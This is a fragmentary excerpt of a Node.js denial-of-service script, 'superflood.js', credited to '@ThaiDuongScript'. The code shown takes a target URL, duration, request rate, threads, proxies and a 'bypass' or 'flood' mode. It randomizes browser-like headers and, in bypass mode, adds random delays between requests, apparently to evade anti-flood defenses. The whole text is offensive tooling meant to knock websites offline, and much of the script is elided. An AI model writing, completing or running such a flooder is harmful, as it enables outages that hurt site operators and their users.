...
if (process.argv.length < 7) {
    console.log('[node superflood.js <url> <time> <requests> <threads> <proxy> <bypass/flood>]'.bgYellow);
    process.exit();
}
...
'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  ...
  'zu-ZA,zu;q=0.8',
    ...
    headers["sec-ch-ua"] = randomElement(userAgents);
    ...
    function runFlooder() {
        ...
        let interval
    	if (args.input === 'flood') {
	  process.stdout.write('Flood Script by @ThaiDuongScript !\r');
	  interval = 1000;
	}
  else if (args.input === 'bypass') {
	  process.stdout.write('Bypass Script by @ThaiDuongScript !\r');
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
	  interval = randomDelay(10000, 25000);
	} else {
